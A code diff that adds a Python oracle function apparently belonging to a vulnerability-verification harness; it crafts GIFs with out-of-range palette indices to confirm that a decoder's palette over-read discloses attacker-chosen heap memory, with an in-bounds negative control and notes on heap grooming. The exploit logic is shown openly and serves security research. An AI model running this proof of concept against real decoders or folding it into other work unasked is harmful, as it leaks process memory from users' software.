@@ -120,3 +120,68 @@ def gif_overindexed(*, colors: int = 2, index: int = 255, width: int = 8, height
     out += _lzw_min8([index] * (width * height))          # image data
     out += _TRAILER
     return bytes(out)
+
+
+# ------------------------------------------------------------------ L3: disclosure, forgery-proof
+
+def confirm_disclosure(read_pixel, *, colors: int = 2, in_bounds_index: int = 0,
+                       probe_indices=(32, 96, 160, 224), width: int = 64, height: int = 8) -> dict:
+    """Confirm the palette over-read DISCLOSES heap memory at an attacker-chosen offset -- L3.
+
+    `read_pixel(gif_bytes) -> (r, g, b) | None` runs the NON-instrumented target on a constructed
+    GIF and returns the first decoded output pixel (the bytes the over-read copied out). The oracle
+    is sound and forgery-proof:
+
+      * NEGATIVE CONTROL -- an IN-BOUNDS pixel index returns exactly the known palette entry. A
+        decoder that bounds-checks or clamps can only ever return palette entries, so this pins
+        what "safe" looks like.
+      * POSITIVE -- two or more OUT-OF-RANGE indices (`pixel >= colours`) return byte triples that
+        (a) are each different from every palette entry and (b) differ from one another. The read
+        address is `Colors + pixel*stride`, so a changing pixel is a changing HEAP OFFSET: the
+        output is heap memory the attacker chose to disclose, varying as the chosen offset varies.
+
+    An echo of the input cannot forge this (the triples are heap, not input bytes); a safe decoder
+    cannot produce offset-dependent non-palette bytes. A wider/taller image is used so the target
+    populates the heap region the over-read reaches (an empty heap discloses only zeros, which is a
+    real read but demonstrates nothing). Returns a verdict dict."""
+    # a palette with distinct, recognisable entries so "a leaked byte equals a palette entry" is a
+    # meaningful exclusion rather than a coincidence of all-zero/all-0xff colours.
+    n = 0
+    while (2 << n) < max(2, colors):
+        n += 1
+    table_size = 2 << n
+    pal = bytearray()
+    for k in range(table_size):
+        pal += bytes(((k * 17 + 1) & 0xFF, (k * 29 + 7) & 0xFF, (k * 43 + 13) & 0xFF))
+    pal_entries = {tuple(pal[3 * k:3 * k + 3]) for k in range(table_size)}
+
+    def _px(idx):
+        g = gif_overindexed(colors=table_size, index=idx, width=width, height=height,
+                            palette=bytes(pal))
+        return read_pixel(g)
+
+    control = _px(in_bounds_index % table_size)
+    want = tuple(pal[3 * (in_bounds_index % table_size):3 * (in_bounds_index % table_size) + 3])
+    if control != want:
+        return {"disclosed": False, "control_ok": False, "control": control, "expected": want,
+                "why": "in-bounds index did not return the known palette entry -- cannot trust the "
+                       "channel (wrong output mode, or the target did not render)"}
+
+    leaked = {}
+    for idx in probe_indices:
+        if idx < table_size:
+            continue
+        px = _px(idx)
+        if px is not None and tuple(px) not in pal_entries:
+            leaked[idx] = tuple(px)
+
+    distinct = set(leaked.values())
+    disclosed = len(leaked) >= 2 and len(distinct) >= 2
+    return {"disclosed": disclosed, "control_ok": True, "control": control,
+            "table_size": table_size, "leaked": leaked,
+            "why": (f"out-of-range pixel indices disclosed {len(distinct)} distinct non-palette "
+                    f"heap triples (attacker-chosen read offset Colors+pixel*stride); in-bounds "
+                    f"index returned the palette entry as a negative control"
+                    if disclosed else
+                    "the over-read region held no attacker-distinguishable heap content on this "
+                    "input (only zeros or palette-equal bytes) -- a larger/groomed heap is needed")}
